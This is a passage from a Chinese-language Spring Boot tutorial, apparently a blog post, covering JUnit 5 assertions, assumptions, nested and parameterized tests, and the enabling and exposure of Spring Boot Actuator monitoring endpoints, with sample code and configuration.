assertNotNull(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>());<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数组断言"><a href="#数组断言" class="headerlink" title="数组断言"></a>数组断言</h3><p>通过 assertArrayEquals 方法来判断两个对象或原始类型的数组是否相等。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;array assertion&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">array</span><span class="hljs-params">()</span> &#123;<br>assertArrayEquals(<span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[] &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="组合断言"><a href="#组合断言" class="headerlink" title="组合断言"></a>组合断言</h3><p><code>assertAll()</code>方法接受多个 <code>org.junit.jupiter.api.Executable</code> 函数式接口的实例作为要验证的断言，可以通过 lambda 表达式很容易的提供这些断言。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;assert all&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">all</span><span class="hljs-params">()</span> &#123;<br> assertAll(<span class="hljs-string">&quot;Math&quot;</span>,<br>    () -&gt; assertEquals(<span class="hljs-number">2</span>, <span class="hljs-number">1</span> + <span class="hljs-number">1</span>),<br>    () -&gt; assertTrue(<span class="hljs-number">1</span> &gt; <span class="hljs-number">0</span>)<br> );<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="异常断言"><a href="#异常断言" class="headerlink" title="异常断言"></a>异常断言</h3><p>在JUnit4时期，想要测试方法的异常情况时，需要用<code>@Rule</code>注解的<code>ExpectedException</code>变量还是比较麻烦的。而JUnit5提供了一种新的断言方式<code>Assertions.assertThrows()</code>，配合函数式编程就可以进行使用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;异常测试&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exceptionTest</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">ArithmeticException</span> <span class="hljs-variable">exception</span> <span class="hljs-operator">=</span> Assertions.assertThrows(<br>           <span class="hljs-comment">//扔出断言异常</span><br>            ArithmeticException.class, () -&gt; System.out.println(<span class="hljs-number">1</span> % <span class="hljs-number">0</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="超时断言"><a href="#超时断言" class="headerlink" title="超时断言"></a>超时断言</h3><p>JUnit5还提供了Assertions.assertTimeout()为测试方法设置了超时时间。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;超时测试&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">timeoutTest</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">//如果测试方法时间超过1s将会异常</span><br>    Assertions.assertTimeout(Duration.ofMillis(<span class="hljs-number">1000</span>), () -&gt; Thread.sleep(<span class="hljs-number">500</span>));<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="快速失败"><a href="#快速失败" class="headerlink" title="快速失败"></a>快速失败</h3><p>通过 fail 方法直接使得测试失败。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Test</span><br><span class="hljs-meta">@DisplayName(&quot;fail&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">shouldFail</span><span class="hljs-params">()</span> &#123;<br>fail(<span class="hljs-string">&quot;This should fail&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="74、单元测试-前置条件"><a href="#74、单元测试-前置条件" class="headerlink" title="74、单元测试-前置条件"></a>74、单元测试-前置条件</h2><p>Unit 5 中的前置条件（assumptions【假设】）类似于断言，不同之处在于不满足的<strong>断言assertions</strong>会使得测试方法失败，而<strong>不满足的前置条件只会使得测试方法的执行终止</strong>。</p><p>前置条件可以看成是测试方法执行的前提，当该前提不满足时，就没有继续执行的必要。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@DisplayName(&quot;前置条件&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AssumptionsTest</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">environment</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;DEV&quot;</span>;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-meta">@DisplayName(&quot;simple&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">simpleAssume</span><span class="hljs-params">()</span> &#123;<br>        assumeTrue(Objects.equals(<span class="hljs-built_in">this</span>.environment, <span class="hljs-string">&quot;DEV&quot;</span>));<br>        assumeFalse(() -&gt; Objects.equals(<span class="hljs-built_in">this</span>.environment, <span class="hljs-string">&quot;PROD&quot;</span>));<br>    &#125;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-meta">@DisplayName(&quot;assume then do&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">assumeThenDo</span><span class="hljs-params">()</span> &#123;<br>        assumingThat(<br>            Objects.equals(<span class="hljs-built_in">this</span>.environment, <span class="hljs-string">&quot;DEV&quot;</span>),<br>            () -&gt; System.out.println(<span class="hljs-string">&quot;In DEV&quot;</span>)<br>        );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>assumeTrue</code> 和 <code>assumFalse</code> 确保给定的条件为 <code>true</code> 或 <code>false</code>，不满足条件会使得测试执行终止。</p><p><code>assumingThat</code> 的参数是表示条件的布尔值和对应的 Executable 接口的实现对象。只有条件满足时，<code>Executable</code> 对象才会被执行；当条件不满足时，测试执行并不会终止。</p><h2 id="75、单元测试-嵌套测试"><a href="#75、单元测试-嵌套测试" class="headerlink" title="75、单元测试-嵌套测试"></a>75、单元测试-嵌套测试</h2><p><a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-nested">官方文档 - Nested Tests</a></p><p>JUnit 5 可以通过 Java 中的内部类和<code>@Nested</code> 注解实现嵌套测试，从而可以更好的把相关的测试方法组织在一起。在内部类中可以使用<code>@BeforeEach</code> 和<code>@AfterEach</code>注解，而且嵌套的层次没有限制。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@DisplayName(&quot;A stack&quot;)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestingAStackDemo</span> &#123;<br><br>    Stack&lt;Object&gt; stack;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-meta">@DisplayName(&quot;is instantiated with new Stack()&quot;)</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">isInstantiatedWithNew</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>&lt;&gt;();<br>    &#125;<br><br>    <span class="hljs-meta">@Nested</span><br>    <span class="hljs-meta">@DisplayName(&quot;when new&quot;)</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">WhenNew</span> &#123;<br><br>        <span class="hljs-meta">@BeforeEach</span><br>        <span class="hljs-keyword">void</span> <span class="hljs-title function_">createNewStack</span><span class="hljs-params">()</span> &#123;<br>            stack = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Stack</span>&lt;&gt;();<br>        &#125;<br><br>        <span class="hljs-meta">@Test</span><br>        <span class="hljs-meta">@DisplayName(&quot;is empty&quot;)</span><br>        <span class="hljs-keyword">void</span> <span class="hljs-title function_">isEmpty</span><span class="hljs-params">()</span> &#123;<br>            assertTrue(stack.isEmpty());<br>        &#125;<br><br>        <span class="hljs-meta">@Test</span><br>        <span class="hljs-meta">@DisplayName(&quot;throws EmptyStackException when popped&quot;)</span><br>        <span class="hljs-keyword">void</span> <span class="hljs-title function_">throwsExceptionWhenPopped</span><span class="hljs-params">()</span> &#123;<br>            assertThrows(EmptyStackException.class, stack::pop);<br>        &#125;<br><br>        <span class="hljs-meta">@Test</span><br>        <span class="hljs-meta">@DisplayName(&quot;throws EmptyStackException when peeked&quot;)</span><br>        <span class="hljs-keyword">void</span> <span class="hljs-title function_">throwsExceptionWhenPeeked</span><span class="hljs-params">()</span> &#123;<br>            assertThrows(EmptyStackException.class, stack::peek);<br>        &#125;<br><br>        <span class="hljs-meta">@Nested</span><br>        <span class="hljs-meta">@DisplayName(&quot;after pushing an element&quot;)</span><br>        <span class="hljs-keyword">class</span> <span class="hljs-title class_">AfterPushing</span> &#123;<br><br>            <span class="hljs-type">String</span> <span class="hljs-variable">anElement</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;an element&quot;</span>;<br><br>            <span class="hljs-meta">@BeforeEach</span><br>            <span class="hljs-keyword">void</span> <span class="hljs-title function_">pushAnElement</span><span class="hljs-params">()</span> &#123;<br>                stack.push(anElement);<br>            &#125;<br><br>            <span class="hljs-meta">@Test</span><br>            <span class="hljs-meta">@DisplayName(&quot;it is no longer empty&quot;)</span><br>            <span class="hljs-keyword">void</span> <span class="hljs-title function_">isNotEmpty</span><span class="hljs-params">()</span> &#123;<br>                assertFalse(stack.isEmpty());<br>            &#125;<br><br>            <span class="hljs-meta">@Test</span><br>            <span class="hljs-meta">@DisplayName(&quot;returns the element when popped and is empty&quot;)</span><br>            <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnElementWhenPopped</span><span class="hljs-params">()</span> &#123;<br>                assertEquals(anElement, stack.pop());<br>                assertTrue(stack.isEmpty());<br>            &#125;<br><br>            <span class="hljs-meta">@Test</span><br>            <span class="hljs-meta">@DisplayName(&quot;returns the element when peeked but remains not empty&quot;)</span><br>            <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnElementWhenPeeked</span><span class="hljs-params">()</span> &#123;<br>                assertEquals(anElement, stack.peek());<br>                assertFalse(stack.isEmpty());<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="76、单元测试-参数化测试"><a href="#76、单元测试-参数化测试" class="headerlink" title="76、单元测试-参数化测试"></a>76、单元测试-参数化测试</h2><p><a href="https://junit.org/junit5/docs/current/user-guide/#writing-tests-parameterized-tests">官方文档 - Parameterized Tests</a></p><p>参数化测试是JUnit5很重要的一个新特性，它使得用不同的参数多次运行测试成为了可能，也为我们的单元测试带来许多便利。</p><p>利用@ValueSource等注解，指定入参，我们将可以使用不同的参数进行多次单元测试，而不需要每新增一个参数就新增一个单元测试，省去了很多冗余代码。</p><p>利用**@ValueSource**等注解，指定入参，我们将可以使用不同的参数进行多次单元测试，而不需要每新增一个参数就新增一个单元测试，省去了很多冗余代码。</p><ul><li><strong>@ValueSource</strong>: 为参数化测试指定入参来源，支持八大基础类以及String类型,Class类型</li><li><strong>@NullSource</strong>: 表示为参数化测试提供一个null的入参</li><li><strong>@EnumSource</strong>: 表示为参数化测试提供一个枚举入参</li><li><strong>@CsvFileSource</strong>：表示读取指定CSV文件内容作为参数化测试入参</li><li><strong>@MethodSource</strong>：表示读取指定方法的返回值作为参数化测试入参(注意方法返回需要是一个流)</li></ul><p>当然如果参数化测试仅仅只能做到指定普通的入参还达不到让我觉得惊艳的地步。让我真正感到他的强大之处的地方在于他可以支持外部的各类入参。如:CSV,YML,JSON 文件甚至方法的返回值也可以作为入参。只需要去实现**<code>ArgumentsProvider</code>**接口，任何外部文件都可以作为它的入参。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ParameterizedTest</span><br><span class="hljs-meta">@ValueSource(strings = &#123;&quot;one&quot;, &quot;two&quot;, &quot;three&quot;&#125;)</span><br><span class="hljs-meta">@DisplayName(&quot;参数化测试1&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">parameterizedTest1</span><span class="hljs-params">(String string)</span> &#123;<br>    System.out.println(string);<br>    Assertions.assertTrue(StringUtils.isNotBlank(string));<br>&#125;<br><br><br><span class="hljs-meta">@ParameterizedTest</span><br><span class="hljs-meta">@MethodSource(&quot;method&quot;)</span>    <span class="hljs-comment">//指定方法名</span><br><span class="hljs-meta">@DisplayName(&quot;方法来源参数&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testWithExplicitLocalMethodSource</span><span class="hljs-params">(String name)</span> &#123;<br>    System.out.println(name);<br>    Assertions.assertNotNull(name);<br>&#125;<br><br><span class="hljs-keyword">static</span> Stream&lt;String&gt; <span class="hljs-title function_">method</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> Stream.of(<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="迁移指南"><a href="#迁移指南" class="headerlink" title="迁移指南"></a>迁移指南</h3><p><a href="https://junit.org/junit5/docs/current/user-guide/#migrating-from-junit4">官方文档 - Migrating from JUnit 4</a></p><p>在进行迁移的时候需要注意如下的变化：</p><ul><li>注解在 <code>org.junit.jupiter.api</code> 包中，断言在 <code>org.junit.jupiter.api.Assertions</code> 类中，前置条件在 <code>org.junit.jupiter.api.Assumptions</code> 类中。</li><li>把<code>@Before</code> 和<code>@After</code> 替换成<code>@BeforeEach</code> 和<code>@AfterEach</code>。</li><li>把<code>@BeforeClass</code> 和<code>@AfterClass</code> 替换成<code>@BeforeAll</code> 和@AfterAll。</li><li>把<code>@Ignore</code> 替换成<code>@Disabled</code>。</li><li>把<code>@Category</code> 替换成<code>@Tag</code>。</li><li>把<code>@RunWith</code>、<code>@Rule</code> 和<code>@ClassRule</code> 替换成<code>@ExtendWith</code>。</li></ul><h2 id="77、指标监控-SpringBoot-Actuator与Endpoint"><a href="#77、指标监控-SpringBoot-Actuator与Endpoint" class="headerlink" title="77、指标监控-SpringBoot Actuator与Endpoint"></a>77、指标监控-SpringBoot Actuator与Endpoint</h2><p>未来每一个微服务在云上部署以后，我们都需要对其进行监控、追踪、审计、控制等。SpringBoot就抽取了Actuator场景，使得我们每个微服务快速引用即可获得生产级别的应用监控、审计等功能。</p><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#production-ready">官方文档 - Spring Boot Actuator: Production-ready Features</a></p><p><strong>1.x与2.x的不同</strong>：</p><ul><li><p>SpringBoot Actuator 1.x</p><ul><li>支持SpringMVC</li><li>基于继承方式进行扩展</li><li>层级Metrics配置</li><li>自定义Metrics收集</li><li>默认较少的安全策略</li></ul></li><li><p>SpringBoot Actuator 2.x</p><ul><li>支持SpringMVC、JAX-RS以及Webflux</li><li>注解驱动进行扩展</li><li>层级&amp;名称空间Metrics</li><li>底层使用MicroMeter，强大、便捷默认丰富的安全策略</li></ul></li></ul><h3 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h3><ul><li>添加依赖：</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-actuator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>访问<code>http://localhost:8080/actuator/**</code>。</li><li>暴露所有监控信息为HTTP。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">management:</span><br>  <span class="hljs-attr">endpoints:</span><br>    <span class="hljs-attr">enabled-by-default:</span> <span class="hljs-literal">true</span> <span class="hljs-comment">#暴露所有端点信息</span><br>    <span class="hljs-attr">web:</span><br>      <span class="hljs-attr">exposure:</span><br>        <span class="hljs-attr">include:</span> <span class="hljs-string">&#x27;*&#x27;</span>  <span class="hljs-comment">#以web方式暴露</span><br></code></pre></td></tr></table></figure><ul><li>测试例子<ul><li><a href="http://localhost:8080/actuator/beans">http://localhost:8080/actuator/beans</a></li><li><a href="http://localhost:8080/actuator/configprops">http://localhost:8080/actuator/configprops</a></li><li><a href="http://localhost:8080/actuator/metrics">http://localhost:8080/actuator/metrics</a></li><li><a href="http://localhost:8080/actuator/metrics/jvm.gc.pause">http://localhost:8080/actuator/metrics/jvm.gc.pause</a></li><li><a href="http://localhost:8080/actuator/metrics/endpointName/detailPath">http://localhost:8080/actuator/metrics/endpointName/detailPath</a></li></ul></li></ul><blockquote><p>actuator</p><p>英 [ˈæktjʊeɪtə]   美 [ˈæktjuˌeɪtər]</p><p>n. 致动（促动，激励，调节）器；传动（装置，机构）；拖动装置；马达；操作机构；执行机构（元件）；（电磁铁）螺线管；操纵装置（阀门）；调速控制器；往复运动油（气）缸；作动筒</p></blockquote><blockquote><p>metric</p><p>英 [ˈmetrɪk]   美 [ˈmetrɪk]</p><p>adj. 米制的;公制的;按公制制作的;用公制测量的</p><p>n. 度量标准;[数学]度量;诗体;韵文;诗韵</p></blockquote><h2 id="78、指标监控-常使用的端点及开启与禁用"><a href="#78、指标监控-常使用的端点及开启与禁用" class="headerlink" title="78、指标监控-常使用的端点及开启与禁用"></a>78、指标监控-常使用的端点及开启与禁用</h2><h3 id="常使用的端点"><a href="#常使用的端点" class="headerlink" title="常使用的端点"></a>常使用的端点</h3><table><thead><tr><th>ID</th><th>描述</th></tr></thead><tbody><tr><td><code>auditevents</code></td><td>暴露当前应用程序的审核事件信息。需要一个<code>AuditEventRepository组件</code>。</td></tr><tr><td><code>beans</code></td><td>显示应用程序中所有Spring Bean的完整列表。</td></tr><tr><td><code>caches</code></td><td>暴露可用的缓存。</td></tr><tr><td><code>conditions</code></td><td>显示自动配置的所有条件信息，包括匹配或不匹配的原因。</td></tr><tr><td><code>configprops</code></td><td>显示所有<code>@ConfigurationProperties</code>。</td></tr><tr><td><code>env</code></td><td>暴露Spring的属性<code>ConfigurableEnvironment</code></td></tr><tr><td><code>flyway</code></td><td>显示已应用的所有Flyway数据库迁移。 需要一个或多个<code>Flyway</code>组件。</td></tr><tr><td><code>health</code></td><td>显示应用程序运行状况信息。</td></tr><tr><td><code>httptrace</code></td><td>显示HTTP跟踪信息（默认情况下，最近100个HTTP请求-响应）。需要一个<code>HttpTraceRepository</code>组件。</td></tr><tr><td><code>info</code></td><td>显示应用程序信息。</td></tr><tr><td><code>integrationgraph</code></td><td>显示Spring <code>integrationgraph</code> 。需要依赖<code>spring-integration-core</code>。</td></tr><tr><td><code>loggers</code></td><td>显示和修改应用程序中日志的配置。</td></tr><tr><td><code>liquibase</code></td><td>显示已应用的所有Liquibase数据库迁移。需要一个或多个<code>Liquibase</code>组件。</td></tr><tr><td><code>metrics</code></td><td>显示当前应用程序的“指标”信息。</td></tr><tr><td><code>mappings</code></td><td>显示所有<code>@RequestMapping</code>路径列表。</td></tr><tr><td><code>scheduledtasks</code></td><td>显示应用程序中的计划任务。</td></tr><tr><td><code>sessions</code></td><td>允许从Spring Session支持的会话存储中检索和删除用户会话。需要使用Spring Session的基于Servlet的Web应用程序。</td></tr><tr><td><code>shutdown</code></td><td>使应用程序正常关闭。默认禁用。</td></tr><tr><td><code>startup</code></td><td>显示由<code>ApplicationStartup</code>收集的启动步骤数据。需要使用<code>SpringApplication</code>进行配置<code>BufferingApplicationStartup</code>。</td></tr><tr><td><code>threaddump</code></td><td>执行线程转储。</td></tr></tbody></table><p>如果您的应用程序是Web应用程序（Spring MVC，Spring WebFlux或Jersey），则可以使用以下附加端点：</p><table><thead><tr><th>ID</th><th>描述</th></tr></thead><tbody><tr><td><code>heapdump</code></td><td>返回<code>hprof</code>堆转储文件。</td></tr><tr><td><code>jolokia</code></td><td>通过HTTP暴露JMX bean（需要引入Jolokia，不适用于WebFlux）。需要引入依赖<code>jolokia-core</code>。</td></tr><tr><td><code>logfile</code></td><td>返回日志文件的内容（如果已设置<code>logging.file.name</code>或<code>logging.file.path</code>属性）。支持使用HTTP<code>Range</code>标头来检索部分日志文件的内容。</td></tr><tr><td><code>prometheus</code></td><td>以Prometheus服务器可以抓取的格式公开指标。需要依赖<code>micrometer-registry-prometheus</code>。</td></tr></tbody></table><p>其中最常用的Endpoint：</p><ul><li><strong>Health：监控状况</strong></li><li><strong>Metrics：运行时指标</strong></li><li><strong>Loggers：日志记录</strong></li></ul><h3 id="Health-Endpoint"><a href="#Health-Endpoint" class="headerlink" title="Health Endpoint"></a>Health Endpoint</h3><p>健康检查端点，我们一般用于在云平台，平台会定时的检查应用的健康状况，我们就需要Health Endpoint可以为平台返回当前应用的一系列组件健康状况的集合。</p><p>重要的几点：</p><ul><li>health endpoint返回的结果，应该是一系列健康检查后的一个汇总报告。</li><li>很多的健康检查默认已经自动配置好了，比如：数据库、redis等。</li><li>可以很容易的添加自定义的健康检查机制。</li></ul><h3 id="Metrics-Endpoint"><a href="#Metrics-Endpoint" class="headerlink" title="Metrics Endpoint"></a>Metrics Endpoint</h3><p>提供详细的、层级的、空间指标信息，这些信息可以被pull（主动推送）或者push（被动获取）方式得到：</p><ul><li>通过Metrics对接多种监控系统。</li><li>简化核心Metrics开发。</li><li>添加自定义Metrics或者扩展已有Metrics。</li></ul><h3 id="开启与禁用Endpoints"><a href="#开启与禁用Endpoints" class="headerlink" title="开启与禁用Endpoints"></a>开启与禁用Endpoints</h3><ul><li>默认所有的Endpoint除过shutdown都是开启的。</li><li>需要开启或者禁用某个Endpoint。配置模式为<code>management.endpoint.&lt;endpointName&gt;.enabled = true</code></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">management:</span><br>  <span class="hljs-attr">endpoint:</span><br>    <span class="hljs-attr">beans:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><ul><li>或者禁用所有的Endpoint然后手动开启指定的Endpoint。</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">management:</span><br>  <span class="hljs-attr">endpoints:</span><br>    <span class="hljs-attr">enabled-by-default:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">endpoint:</span><br>    <span class="hljs-attr">beans:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">health:</span><br>      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><h3 id="暴露Endpoints"><a href="#暴露Endpoints" class="headerlink" title="暴露Endpoints"></a>暴露Endpoints</h3><p>支持的暴露方式</p><ul><li>HTTP：默认只暴露health和info。</li><li>JMX：默认暴露所有Endpoint。</li><li>除过health和info，剩下的Endpoint都应该进行保护访问。如果引入Spring Security，则会默认配置安全访问规则。</li></ul><table><thead><tr><th align="left">ID</th><th align="left">JMX</th><th align="left">Web</th></tr></thead><tbody><tr><td align="left"><code>auditevents</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>beans</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>caches</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>conditions</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>configprops</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>env</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>flyway</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>health</code></td><td align="left">Yes</td><td align="left">Yes</td></tr><tr><td align="left"><code>heapdump</code></td><td align="left">N&#x2F;A</td><td align="left">No</td></tr><tr><td align="left"><code>httptrace</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>info</code></td><td align="left">Yes</td><td align="left">Yes</td></tr><tr><td align="left"><code>integrationgraph</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>jolokia</code></td><td align="left">N&#x2F;A</td><td align="left">No</td></tr><tr><td align="left"><code>logfile</code></td><td align="left">N&#x2F;A</td><td align="left">No</td></tr><tr><td align="left"><code>loggers</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>liquibase</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>metrics</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>mappings</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>prometheus</code></td><td align="left">N&#x2F;A</td><td align="left">No</td></tr><tr><td align="left"><code>scheduledtasks</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>sessions</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>shutdown</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>startup</code></td><td align="left">Yes</td><td align="left">No</td></tr><tr><td align="left"><code>threaddump</code></td><td align="left">Yes</td><td 